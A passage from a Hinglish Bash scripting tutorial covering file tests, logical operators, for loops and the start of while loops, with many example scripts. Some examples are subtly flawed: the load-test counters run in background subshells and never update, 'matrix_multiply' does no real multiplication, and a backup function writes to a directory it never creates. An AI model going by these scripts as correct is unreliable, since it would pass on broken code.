- 💡 **Error messages:** Clear feedback do

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Configuration file manager

CONFIG_DIR="/etc/myapp"
CONFIG_FILE="$CONFIG_DIR/config.conf"
BACKUP_DIR="$CONFIG_DIR/backups"

# Ensure config directory exists
if [[ ! -d $CONFIG_DIR ]]; then
    echo "Creating config directory..."
    if ! mkdir -p "$CONFIG_DIR"; then
        echo "✗ Failed to create config directory"
        exit 1
    fi
fi

# Check if config file exists
if [[ ! -f $CONFIG_FILE ]]; then
    echo "Config file not found. Creating default..."
    
    cat > "$CONFIG_FILE" << 'EOF'
# Application Configuration
APP_NAME=myapp
PORT=8080
DEBUG=false
EOF
    
    echo "✓ Default config created"
fi

# Validate config file
if [[ ! -r $CONFIG_FILE ]]; then
    echo "✗ Cannot read config file"
    exit 1
fi

if [[ ! -s $CONFIG_FILE ]]; then
    echo "✗ Config file is empty"
    exit 1
fi

# Backup before modification
if [[ -w $CONFIG_FILE ]]; then
    echo "Creating backup..."
    
    mkdir -p "$BACKUP_DIR"
    backup_file="$BACKUP_DIR/config_$(date +%Y%m%d_%H%M%S).conf"
    
    if cp "$CONFIG_FILE" "$backup_file"; then
        echo "✓ Backup created: $backup_file"
    else
        echo "⚠️  Backup failed, but continuing..."
    fi
fi

# Modify config
if [[ -w $CONFIG_FILE ]]; then
    echo "Updating configuration..."
    sed -i 's/DEBUG=false/DEBUG=true/' "$CONFIG_FILE"
    echo "✓ Configuration updated"
else
    echo "✗ Cannot write to config file"
    exit 1
fi

# Verify modification
if grep -q "DEBUG=true" "$CONFIG_FILE"; then
    echo "✓ Verification successful"
else
    echo "✗ Verification failed"
    
    # Restore from backup
    if [[ -f $backup_file ]]; then
        echo "Restoring from backup..."
        cp "$backup_file" "$CONFIG_FILE"
    fi
    exit 1
fi
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `-e` exists, `-f` file, `-d` directory
- ✅ `-s` not empty
- ✅ `-r` readable, `-w` writable, `-x` executable
- ✅ Hamesha check karo operations se pehle
- ✅ Specific tests use karo

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `-e` aur `-f` mein kya fark hai?**
A: `-e` kuch bhi (file, directory, device), `-f` sirf regular file.

**Q2: Symbolic link kaise check karu?**
A: `-L` use karo: `[[ -L path ]]`

**Q3: Multiple conditions kaise check karu?**
A: Combine karo: `[[ -f $file && -r $file && -s $file ]]`

### 14. **Practice ke liye Task**

```bash
# 1. File exists
[[ -f "test.txt" ]] && echo "File exists"

# 2. Directory exists
[[ -d "/tmp" ]] && echo "Directory exists"

# 3. Create if not exists
if [[ ! -d "backup" ]]; then
    mkdir backup
fi

# 4. Readable check
if [[ -r "data.txt" ]]; then
    cat data.txt
fi

# 5. Writable check
if [[ -w "log.txt" ]]; then
    echo "Log entry" >> log.txt
fi

# 6. Executable check
if [[ -x "script.sh" ]]; then
    ./script.sh
else
    chmod +x script.sh
fi

# 7. Not empty
if [[ -s "file.txt" ]]; then
    echo "File has content"
fi
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📁 `-e` exists, `-f` file, `-d` directory
- 📏 `-s` not empty (size > 0)
- 🔐 `-r` read, `-w` write, `-x` execute
- ✅ Hamesha validate before operations
- 🎯 Specific tests better than generic

> **💡 Ye Zaroor Yaad Rakhein:**
> File operations se pehle HAMESHA check karo! `-f` file ke liye, `-d` directory ke liye, `-r`/`-w`/`-x` permissions ke liye. Safety first!

---

## **Topic 6: Logical Operators (`!`, `&&`, `||`, `-a`, `-o`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Logical Operators** - Multiple conditions ko combine karna.

### 2. **Ye Kya Hai? (What is it?)**
Logical operators multiple conditions ko combine karte hain - NOT (`!`), AND (`&&`, `-a`), OR (`||`, `-o`). Yeh complex logic banane ke liye essential hain.

**Analogy:** Socho ki logical operators traffic rules hain. AND = dono signals green chahiye, OR = koi ek green ho, NOT = signal red nahi hona chahiye.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Complex logic** - Multiple conditions
- ✅ **Validation** - Comprehensive checks
- ✅ **Efficiency** - Short-circuit evaluation
- ✅ **Readability** - Clear logic

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Multiple conditions check
- Complex validation
- Permission checks
- Range validation

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Nested if statements (messy)
- Logic errors
- Code duplication
- Poor readability

### 6. **Syntax aur Common Options**

```bash
# NOT
[[ ! condition ]]

# AND (modern)
[[ condition1 && condition2 ]]
[[ condition1 ]] && [[ condition2 ]]

# OR (modern)
[[ condition1 || condition2 ]]
[[ condition1 ]] || [[ condition2 ]]

# AND (old - in [ ])
[ condition1 -a condition2 ]

# OR (old - in [ ])
[ condition1 -o condition2 ]
```

**Operators:**
- `!` : NOT (negation)
- `&&` : AND (both true)
- `||` : OR (at least one true)
- `-a` : AND (old, in `[ ]`)
- `-o` : OR (old, in `[ ]`)

### 7. **Example 1 (Basic)**

```bash
# NOT
if [[ ! -f "file.txt" ]]; then
    echo "File does not exist"
fi

# AND
age=25
country="India"
if [[ $age -ge 18 && $country == "India" ]]; then
    echo "Eligible to vote"
fi

# OR
if [[ $user == "admin" || $user == "root" ]]; then
    echo "Superuser access"
fi

# Complex
score=85
attendance=90
if [[ $score -ge 80 && $attendance -ge 75 ]]; then
    echo "Pass with distinction"
elif [[ $score -ge 60 || $attendance -ge 90 ]]; then
    echo "Pass"
else
    echo "Fail"
fi
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# User access control system

check_access() {
    local user=$1
    local resource=$2
    local action=$3
    
    # Admin has full access
    if [[ $user == "admin" || $user == "root" ]]; then
        echo "✓ Admin access granted"
        return 0
    fi
    
    # Check file permissions
    if [[ ! -e $resource ]]; then
        echo "✗ Resource not found: $resource"
        return 1
    fi
    
    # Read access
    if [[ $action == "read" ]]; then
        if [[ -r $resource ]]; then
            echo "✓ Read access granted"
            return 0
        else
            echo "✗ Read access denied"
            return 1
        fi
    fi
    
    # Write access
    if [[ $action == "write" ]]; then
        if [[ -w $resource && -f $resource ]]; then
            echo "✓ Write access granted"
            return 0
        else
            echo "✗ Write access denied"
            return 1
        fi
    fi
    
    # Execute access
    if [[ $action == "execute" ]]; then
        if [[ -x $resource && -f $resource ]]; then
            echo "✓ Execute access granted"
            return 0
        else
            echo "✗ Execute access denied"
            return 1
        fi
    fi
    
    echo "✗ Invalid action: $action"
    return 1
}

# Validate user input
validate_registration() {
    local username=$1
    local email=$2
    local age=$3
    
    local errors=0
    
    # Username validation
    if [[ -z $username || ${#username} -lt 3 || ${#username} -gt 20 ]]; then
        echo "✗ Invalid username (3-20 characters required)"
        ((errors++))
    fi
    
    # Email validation
    if [[ ! $email =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
        echo "✗ Invalid email format"
        ((errors++))
    fi
    
    # Age validation
    if [[ ! $age =~ ^[0-9]+$ || $age -lt 13 || $age -gt 120 ]]; then
        echo "✗ Invalid age (13-120 required)"
        ((errors++))
    fi
    
    # Check if username exists
    if [[ -f "/etc/users/$username" ]]; then
        echo "✗ Username already exists"
        ((errors++))
    fi
    
    if [[ $errors -eq 0 ]]; then
        echo "✓ All validations passed"
        return 0
    else
        echo "✗ $errors validation error(s)"
        return 1
    fi
}

# System health check
check_system_health() {
    local issues=0
    
    # Disk check
    local disk_usage=$(df / | awk 'NR==2 {print $5}' | sed 's/%//')
    if [[ $disk_usage -gt 90 ]]; then
        echo "⚠️  Disk usage critical: ${disk_usage}%"
        ((issues++))
    fi
    
    # Memory check
    local mem_usage=$(free | awk 'NR==2 {printf "%.0f", $3/$2*100}')
    if [[ $mem_usage -gt 90 ]]; then
        echo "⚠️  Memory usage critical: ${mem_usage}%"
        ((issues++))
    fi
    
    # Service checks
    for service in apache2 mysql redis; do
        if ! systemctl is-active --quiet "$service"; then
            echo "⚠️  Service down: $service"
            ((issues++))
        fi
    done
    
    if [[ $issues -eq 0 ]]; then
        echo "✓ System healthy"
        return 0
    else
        echo "⚠️  $issues issue(s) detected"
        return 1
    fi
}

# Examples
check_access "admin" "/etc/passwd" "read"
validate_registration "john_doe" "john@example.com" "25"
check_system_health
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`-a` aur `-o` in `[[ ]]`:** Use `&&` and `||` instead
- ❌ **Precedence ignore:** Parentheses use karo complex logic mein
- ❌ **Short-circuit nahi samajhna:** `&&` aur `||` evaluation stop karte hain

### 10. **Best Practices / Pro Tips**
- 💡 **`[[ ]]` mein `&&` `||`:** Modern aur readable
- 💡 **Parentheses:** Complex logic group karo
- 💡 **Short-circuit:** Expensive checks last mein
- 💡 **Readability:** Ek line mein bahut saare conditions avoid karo

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Deployment validation script

DEPLOY_ENV=$1
APP_DIR="/var/www/app"
CONFIG_FILE="$APP_DIR/.env"
MIN_DISK_GB=5
MIN_MEM_GB=2

echo "=== Deployment Validation ==="

# Environment check
if [[ $DEPLOY_ENV != "staging" && $DEPLOY_ENV != "production" ]]; then
    echo "✗ Invalid environment: $DEPLOY_ENV"
    echo "  Must be 'staging' or 'production'"
    exit 1
fi

# Directory checks
if [[ ! -d $APP_DIR || ! -w $APP_DIR ]]; then
    echo "✗ App directory not accessible: $APP_DIR"
    exit 1
fi

# Config file check
if [[ ! -f $CONFIG_FILE || ! -r $CONFIG_FILE ]]; then
    echo "✗ Config file missing or not readable"
    exit 1
fi

# Resource checks
disk_avail=$(df "$APP_DIR" | awk 'NR==2 {print int($4/1024/1024)}')
mem_avail=$(free -g | awk 'NR==2 {print $7}')

if [[ $disk_avail -lt $MIN_DISK_GB || $mem_avail -lt $MIN_MEM_GB ]]; then
    echo "✗ Insufficient resources"
    echo "  Disk: ${disk_avail}GB (need ${MIN_DISK_GB}GB)"
    echo "  Memory: ${mem_avail}GB (need ${MIN_MEM_GB}GB)"
    exit 1
fi

# Service checks
if [[ $DEPLOY_ENV == "production" ]]; then
    for service in nginx mysql redis; do
        if ! systemctl is-active --quiet "$service"; then
            echo "✗ Required service not running: $service"
            exit 1
        fi
    done
fi

# Git checks
if [[ -d "$APP_DIR/.git" ]]; then
    cd "$APP_DIR"
    
    if [[ -n $(git status --porcelain) ]]; then
        echo "⚠️  Uncommitted changes detected"
        
        if [[ $DEPLOY_ENV == "production" ]]; then
            echo "✗ Cannot deploy to production with uncommitted changes"
            exit 1
        fi
    fi
fi

echo "✓ All validations passed"
echo "Ready to deploy to: $DEPLOY_ENV"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `!` NOT, `&&` AND, `||` OR
- ✅ `[[ ]]` mein `&&` `||` use karo
- ✅ Short-circuit evaluation
- ✅ Parentheses for grouping
- ✅ Readability important

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `-a` aur `&&` mein kya fark hai?**
A: `-a` old (`[ ]` mein), `&&` modern (`[[ ]]` mein). `&&` prefer karo.

**Q2: Short-circuit evaluation kya hai?**
A: `&&` mein agar pehla false toh doosra check nahi hota. `||` mein agar pehla true toh doosra check nahi hota.

**Q3: Complex logic kaise organize karu?**
A: Parentheses use karo aur multiple lines mein likho readability ke liye.

### 14. **Practice ke liye Task**

```bash
# 1. NOT
[[ ! -f "missing.txt" ]] && echo "File not found"

# 2. AND
age=25
if [[ $age -ge 18 && $age -le 65 ]]; then
    echo "Working age"
fi

# 3. OR
user="admin"
if [[ $user == "admin" || $user == "root" ]]; then
    echo "Superuser"
fi

# 4. Complex
score=85
attendance=80
if [[ $score -ge 80 && $attendance -ge 75 ]]; then
    echo "Distinction"
fi

# 5. Multiple conditions
file="test.txt"
if [[ -f $file && -r $file && -s $file ]]; then
    echo "File is readable and not empty"
fi

# 6. Grouped logic
x=50
if [[ ($x -gt 0 && $x -lt 50) || $x -eq 100 ]]; then
    echo "Special value"
fi
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔀 `!` NOT, `&&` AND, `||` OR
- 🎯 `[[ ]]` mein modern operators use karo
- ⚡ Short-circuit evaluation efficient hai
- 📝 Parentheses complex logic ke liye
- ✅ Readability > cleverness

> **💡 Ye Zaroor Yaad Rakhein:**
> Logical operators complex conditions ke liye essential hain! `[[ ]]` mein `&&` aur `||` use karo. Short-circuit evaluation samjho - efficiency aur safety dono!

---

# **🎉 Module 7 Complete! 🎉**

Congratulations! Aapne **Module 7: Scripting Logic & Control Flow** successfully complete kar liya hai!

## **Aapne Kya Seekha:**
✅ **if-elif-else** - Decision making
✅ **Test Brackets** - `[ ]` vs `[[ ]]`
✅ **String Tests** - `==`, `!=`, `-z`, `-n`
✅ **Numeric Tests** - `-eq`, `-ne`, `-lt`, `-gt`
✅ **File Tests** - `-e`, `-f`, `-d`, `-r`, `-w`, `-x`
✅ **Logical Operators** - `!`, `&&`, `||`

## **Key Patterns:**
```bash
# Conditional logic
if [[ condition ]]; then
    commands
elif [[ condition2 ]]; then
    commands
else
    commands
fi

# String tests
[[ -z $var ]]           # Empty
[[ $str1 == $str2 ]]    # Equal

# Numeric tests
[[ $num -gt 10 ]]       # Greater than

# File tests
[[ -f $file ]]          # Is file
[[ -r $file ]]          # Readable

# Logical operators
[[ cond1 && cond2 ]]    # AND
[[ cond1 || cond2 ]]    # OR
[[ ! condition ]]       # NOT
```

## **Best Practices:**
- Use `[[ ]]` over `[ ]`
- Always quote variables
- Check files before operations
- Use logical operators for complex conditions
- Meaningful exit codes

## **Next Steps:**
Ab aap ready hain **Module 8: Loops & Control** ke liye!

---

=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 8)**

---

## **PART 2: THE CORE OF SCRIPTING**

---

# **Module 8: Loops & Control**

---

## **Topic 1: `for` Loop (List-based: `for i in {1..5}`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**for Loop (List-based)** - List ke har item par iterate karna.

### 2. **Ye Kya Hai? (What is it?)**
List-based `for` loop ek list ke har element par ek-ek karke kaam karta hai. List files, numbers, strings, ya kuch bhi ho sakti hai.

**Analogy:** Socho ki aapke paas ek playlist hai. For loop har song ko ek-ek karke play karta hai - pehla song, phir doosra, phir teesra.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Iteration** - Multiple items process karna
- ✅ **Automation** - Repetitive tasks
- ✅ **File processing** - Batch operations
- ✅ **Data processing** - Arrays, lists handle karna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Multiple files process karni hon
- List of items par kaam karna ho
- Range of numbers iterate karni ho
- Array elements process karne hon

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Manual repetition (time waste)
- Code duplication
- Batch operations impossible
- Automation limited

### 6. **Syntax aur Common Options**

```bash
# Basic list
for item in item1 item2 item3; do
    commands
done

# Range (brace expansion)
for i in {1..10}; do
    commands
done

# Files
for file in *.txt; do
    commands
done

# Command output
for user in $(cat users.txt); do
    commands
done

# Array
for item in "${array[@]}"; do
    commands
done
```

### 7. **Example 1 (Basic)**

```bash
# Simple list
for name in Alice Bob Charlie; do
    echo "Hello, $name"
done

# Number range
for i in {1..5}; do
    echo "Number: $i"
done

# Files
for file in *.txt; do
    echo "Processing: $file"
done

# Step range
for i in {0..10..2}; do
    echo "Even: $i"
done
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Batch file processor

process_images() {
    local source_dir=$1
    local dest_dir=$2
    
    mkdir -p "$dest_dir"
    
    for img in "$source_dir"/*.{jpg,png,gif}; do
        [[ -f $img ]] || continue
        
        filename=$(basename "$img")
        name="${filename%.*}"
        ext="${filename##*.}"
        
        echo "Processing: $filename"
        
        # Resize
        convert "$img" -resize 800x600 "$dest_dir/${name}_resized.$ext"
        
        # Thumbnail
        convert "$img" -resize 150x150 "$dest_dir/${name}_thumb.$ext"
        
        echo "  ✓ Created resized and thumbnail"
    done
}

# Backup multiple directories
backup_dirs() {
    local backup_root="/backups/$(date +%Y%m%d)"
    
    for dir in /home /etc /var/www; do
        [[ -d $dir ]] || continue
        
        echo "Backing up: $dir"
        
        dir_name=$(basename "$dir")
        tar -czf "$backup_root/${dir_name}.tar.gz" "$dir" 2>/dev/null
        
        if [[ $? -eq 0 ]]; then
            echo "  ✓ Backup successful"
        else
            echo "  ✗ Backup failed"
        fi
    done
}

# User creation from list
create_users() {
    local user_list=$1
    
    while IFS=: read -r username fullname email; do
        echo "Creating user: $username"
        
        if id "$username" &>/dev/null; then
            echo "  ⚠️  User already exists"
            continue
        fi
        
        useradd -m -c "$fullname" "$username"
        echo "  ✓ User created"
        
        # Send welcome email
        echo "Welcome $fullname" | mail -s "Account Created" "$email"
    done < "$user_list"
}

# Process log files
analyze_logs() {
    for log in /var/log/app/*.log; do
        [[ -f $log ]] || continue
        
        filename=$(basename "$log")
        echo "Analyzing: $filename"
        
        errors=$(grep -c "ERROR" "$log")
        warnings=$(grep -c "WARN" "$log")
        
        echo "  Errors: $errors"
        echo "  Warnings: $warnings"
        
        if [[ $errors -gt 0 ]]; then
            echo "  ⚠️  Errors found, check log"
        fi
    done
}

process_images "/data/images" "/data/processed"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Quotes bhoolna:** `for file in *.txt` spaces wale names break karenge
- ❌ **Globbing fail:** Agar koi file nahi toh loop literal string par chalega
- ❌ **IFS issues:** Word splitting problems

### 10. **Best Practices / Pro Tips**
- 💡 **Quotes use karo:** `"$item"` safe hai
- 💡 **Check existence:** `[[ -f $file ]]` pehle check karo
- 💡 **Arrays prefer:** `"${array[@]}"` safer than command substitution
- 💡 **Nullglob:** `shopt -s nullglob` agar files nahi hon

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Server deployment script

SERVERS=("web1.example.com" "web2.example.com" "web3.example.com")
APP_DIR="/var/www/app"
DEPLOY_USER="deploy"

echo "=== Deploying to ${#SERVERS[@]} servers ==="

for server in "${SERVERS[@]}"; do
    echo ""
    echo "Deploying to: $server"
    
    # Check connectivity
    if ! ping -c 1 "$server" &>/dev/null; then
        echo "  ✗ Server unreachable"
        continue
    fi
    
    # Deploy
    echo "  Uploading files..."
    if scp -r ./dist/* "$DEPLOY_USER@$server:$APP_DIR/"; then
        echo "  ✓ Files uploaded"
    else
        echo "  ✗ Upload failed"
        continue
    fi
    
    # Restart service
    echo "  Restarting service..."
    if ssh "$DEPLOY_USER@$server" "systemctl restart app"; then
        echo "  ✓ Service restarted"
    else
        echo "  ✗ Restart failed"
    fi
    
    echo "  ✓ Deployment complete"
done

echo ""
echo "=== Deployment finished ==="
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `for item in list; do ... done`
- ✅ `{1..10}` range ke liye
- ✅ `*.txt` files ke liye
- ✅ `"${array[@]}"` arrays ke liye
- ✅ Quotes aur checks zaroori

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Agar koi file match nahi hui toh?**
A: Loop literal string par chalega. `shopt -s nullglob` use karo ya check karo.

**Q2: Spaces wale filenames kaise handle karu?**
A: Quotes use karo: `for file in *.txt; do echo "$file"; done`

**Q3: Command output par loop kaise?**
A: `for item in $(command); do` lekin arrays prefer karo.

### 14. **Practice ke liye Task**

```bash
# 1. Simple list
for fruit in apple banana cherry; do
    echo "Fruit: $fruit"
done

# 2. Number range
for i in {1..10}; do
    echo "Count: $i"
done

# 3. Files
for file in *.txt; do
    [[ -f $file ]] && echo "File: $file"
done

# 4. Step range
for i in {0..20..5}; do
    echo "Multiple of 5: $i"
done

# 5. Array
colors=("red" "green" "blue")
for color in "${colors[@]}"; do
    echo "Color: $color"
done
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔁 List ke har item par iterate
- 📊 `{1..10}` ranges ke liye
- 📁 `*.txt` file patterns ke liye
- 🎯 Arrays safest option
- 💬 Quotes hamesha use karo

> **💡 Ye Zaroor Yaad Rakhein:**
> For loops automation ka backbone hain! Hamesha quotes use karo, file existence check karo, aur arrays prefer karo command substitution se!

---

## **Topic 2: `for` Loop (C-style: `for (( i=1; i<=10; i++ ))`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**for Loop (C-style)** - Traditional programming jaisa loop with counter.

### 2. **Ye Kya Hai? (What is it?)**
C-style for loop traditional programming languages (C, Java) jaisa syntax use karta hai - initialization, condition, increment. Yeh numeric iterations ke liye perfect hai.

**Analogy:** Socho ki C-style loop ek stopwatch hai jo start se end tak count karta hai, har second par kuch kaam karta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Numeric iteration** - Counter-based loops
- ✅ **Precise control** - Start, end, step control
- ✅ **Familiar syntax** - C/Java programmers ke liye
- ✅ **Complex conditions** - Multiple variables

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Numeric counters chahiye
- Complex loop conditions
- Multiple variables track karne hon
- Traditional loop syntax prefer karo

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- List-based loops verbose honge
- Counter management manual
- Complex iterations mushkil
- Code less readable

### 6. **Syntax aur Common Options**

```bash
# Basic C-style
for (( i=1; i<=10; i++ )); do
    commands
done

# Custom step
for (( i=0; i<=100; i+=10 )); do
    commands
done

# Decrement
for (( i=10; i>=1; i-- )); do
    commands
done

# Multiple variables
for (( i=0, j=10; i<j; i++, j-- )); do
    commands
done
```

### 7. **Example 1 (Basic)**

```bash
# Count 1 to 10
for (( i=1; i<=10; i++ )); do
    echo "Number: $i"
done

# Even numbers
for (( i=0; i<=20; i+=2 )); do
    echo "Even: $i"
done

# Countdown
for (( i=10; i>=1; i-- )); do
    echo "Countdown: $i"
    sleep 1
done
echo "Blast off!"

# Multiplication table
for (( i=1; i<=10; i++ )); do
    result=$((5 * i))
    echo "5 x $i = $result"
done
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Performance testing script

run_load_test() {
    local url=$1
    local requests=$2
    local concurrent=$3
    
    echo "=== Load Test ==="
    echo "URL: $url"
    echo "Requests: $requests"
    echo "Concurrent: $concurrent"
    
    local success=0
    local failed=0
    
    for (( i=1; i<=requests; i++ )); do
        if (( i % concurrent == 0 )); then
            wait  # Wait for background jobs
        fi
        
        # Send request in background
        {
            if curl -s -o /dev/null -w "%{http_code}" "$url" | grep -q "200"; then
                ((success++))
            else
                ((failed++))
            fi
        } &
        
        # Progress
        if (( i % 10 == 0 )); then
            printf "\rProgress: %d/%d" $i $requests
        fi
    done
    
    wait  # Wait for remaining jobs
    
    echo ""
    echo "Results:"
    echo "  Success: $success"
    echo "  Failed: $failed"
    echo "  Success rate: $(( success * 100 / requests ))%"
}

# Batch file renaming
rename_files() {
    local pattern=$1
    local prefix=$2
    
    local count=1
    
    for file in $pattern; do
        [[ -f $file ]] || continue
        
        ext="${file##*.}"
        new_name="${prefix}_$(printf "%03d" $count).$ext"
        
        mv "$file" "$new_name"
        echo "Renamed: $file → $new_name"
        
        ((count++))
    done
}

# Progress bar
show_progress() {
    local duration=$1
    local steps=50
    
    for (( i=0; i<=steps; i++ )); do
        percent=$(( i * 100 / steps ))
        bar=$(printf "%${i}s" | tr ' ' '█')
        spaces=$(printf "%$((steps - i))s")
        
        printf "\r[%s%s] %d%%" "$bar" "$spaces" "$percent"
        
        sleep $(echo "$duration / $steps" | bc -l)
    done
    
    echo ""
}

# Matrix multiplication
matrix_multiply() {
    local size=$1
    
    echo "Multiplying ${size}x${size} matrices..."
    
    for (( i=0; i<size; i++ )); do
        for (( j=0; j<size; j++ )); do
            sum=0
            for (( k=0; k<size; k++ )); do
                ((sum += i * j * k))
            done
            result[i*size+j]=$sum
        done
    done
    
    echo "Multiplication complete"
}

run_load_test "http://localhost:8080" 100 10
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Spaces galat:** `for((i=1;i<=10;i++))` galat, spaces chahiye
- ❌ **`$` use karna:** `for (( $i=1; ... ))` galat, `for (( i=1; ... ))` sahi
- ❌ **Infinite loops:** Condition check karo

### 10. **Best Practices / Pro Tips**
- 💡 **Spaces use karo:** Readability ke liye
- 💡 **No `$` inside:** Variables directly use karo
- 💡 **Infinite loop check:** Condition validate karo
- 💡 **Performance:** Numeric operations fast hain

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Database backup rotation

DB_NAME="production"
BACKUP_DIR="/backups/database"
KEEP_DAYS=7

echo "=== Database Backup Rotation ==="

# Create new backup
echo "Creating backup..."
backup_file="$BACKUP_DIR/${DB_NAME}_$(date +%Y%m%d_%H%M%S).sql"
mysqldump "$DB_NAME" > "$backup_file"
gzip "$backup_file"

echo "✓ Backup created: ${backup_file}.gz"

# Count and cleanup old backups
backup_count=$(ls -1 "$BACKUP_DIR"/${DB_NAME}_*.sql.gz 2>/dev/null | wc -l)

echo "Total backups: $backup_count"

if (( backup_count > KEEP_DAYS )); then
    to_delete=$(( backup_count - KEEP_DAYS ))
    echo "Deleting $to_delete old backups..."
    
    deleted=0
    for backup in $(ls -t "$BACKUP_DIR"/${DB_NAME}_*.sql.gz | tail -n "$to_delete"); do
        echo "  Deleting: $(basename $backup)"
        rm "$backup"
        ((deleted++))
    done
    
    echo "✓ Deleted $deleted backups"
fi

# Verify backups
echo ""
echo "Current backups:"
for (( i=1; i<=KEEP_DAYS; i++ )); do
    backup=$(ls -t "$BACKUP_DIR"/${DB_NAME}_*.sql.gz 2>/dev/null | sed -n "${i}p")
    if [[ -n $backup ]]; then
        size=$(du -h "$backup" | cut -f1)
        date=$(stat -c %y "$backup" | cut -d' ' -f1)
        echo "  $i. $(basename $backup) - $size - $date"
    fi
done
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `for (( init; condition; increment ))`
- ✅ C/Java jaisa syntax
- ✅ Numeric iterations perfect
- ✅ No `$` inside `(())`
- ✅ Spaces zaroori

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: List-based aur C-style mein kab kaunsa use karu?**
A: Lists/files ke liye list-based, numeric counters ke liye C-style.

**Q2: Kya multiple variables use kar sakte hain?**
A: Haan! `for (( i=0, j=10; i<j; i++, j-- ))`

**Q3: Infinite loop kaise banau?**
A: `for (( ; ; )); do ... done` ya `while true; do ... done`

### 14. **Practice ke liye Task**

```bash
# 1. Basic counter
for (( i=1; i<=5; i++ )); do
    echo "Count: $i"
done

# 2. Custom step
for (( i=0; i<=100; i+=10 )); do
    echo "Value: $i"
done

# 3. Countdown
for (( i=10; i>=1; i-- )); do
    echo "$i..."
    sleep 1
done

# 4. Multiplication table
for (( i=1; i<=10; i++ )); do
    echo "7 x $i = $((7 * i))"
done

# 5. Multiple variables
for (( i=0, j=10; i<=j; i++, j-- )); do
    echo "i=$i, j=$j"
done
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔢 C-style syntax: `for (( i=1; i<=10; i++ ))`
- 🎯 Numeric iterations ke liye perfect
- 🚫 No `$` inside `(())`
- ⚙️ Init, condition, increment control
- 📊 Complex counters handle kar sakta hai

> **💡 Ye Zaroor Yaad Rakhein:**
> C-style loops numeric iterations ke liye best hain! No `$` inside, spaces use karo, aur condition validate karo infinite loops se bachne ke liye!

---

## **Topic 3: `while` Loop (`while [ ... ]`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**while Loop** - Jab tak condition true hai tab tak repeat karo.

### 2. **Ye Kya Hai? (What is it?)**
`while` loop tab tak chalta rahta hai jab tak condition true hai. Jaise hi condition false hui, loop band ho jaata hai. Yeh unknown iterations ke liye perfect hai.

**Analogy:** Socho ki while loop ek guard hai jo gate par khada hai. Jab tak pass valid hai (condition true), andar jaane deta hai. Pass invalid hua (condition false), gate band.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Unknown iterations** - Jab pata nahi kitni baar
- ✅ **Condition-based** - Dynamic stopping
- ✅ **File reading** - Line-by-line processing
- ✅ **User input** - Until valid input

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- File line-by-line read karni ho
- User input validate karna ho
- Condition-based loops
- Monitoring scripts

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- For loops verbose honge
- File reading mushkil
- Infinite loops ka risk
- Dynamic conditions handle nahi kar paoge

### 6. **Syntax aur Common Options**

```bash
# Basic while
while [ condition ]; do
    commands
done

# Read file
while IFS= read -r line; do
    commands
done < file.txt

# Infinite loop
while true; do
    commands
done

# Until (opposite of while)
until [ condition ]; do
    commands
done
```

### 7. **Example 1 (Basic)**

```bash
# Counter
count=1
while [ $count -le 5 ]; do
    echo "Count: $count"
    ((count++))
done

# User input
while true; do
    read -p "Enter password: " pass
    if [[ $pass == "secret" ]]; then
        echo "Access granted"
        break
    else
        echo "Wrong password, try again"
    fi
done

# File reading
while IFS= read -r line; do
    echo "Line: $line"
done < data.txt

# Until loop
count=1
until [ $count -gt 5 ]; do
    echo "Count: $count"
    ((count++))
done
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Service monitor

monitor_service() {
    local service=$1
    local check_interval=5
    local max_failures=3
    local failures=0
    
    echo "Monitoring: $service"
    
    while true; do
        if systemctl is-active --quiet "$service"; then
            echo "[$(date '+%H:%M:%S')] ✓ $service is running"
            failures=0
        else
            ((failures++))
            echo "[$(date '+%H:%M:%S')] ✗ $service is down (failure $failures/$max_failures)"
            
            if [ $failures -ge $max_failures ]; then
                echo "Max failures reached. Attempting restart..."
                
                if systemctl restart "$service"; then
                    echo "✓ Service restarted successfully"
                    failures=0
                else
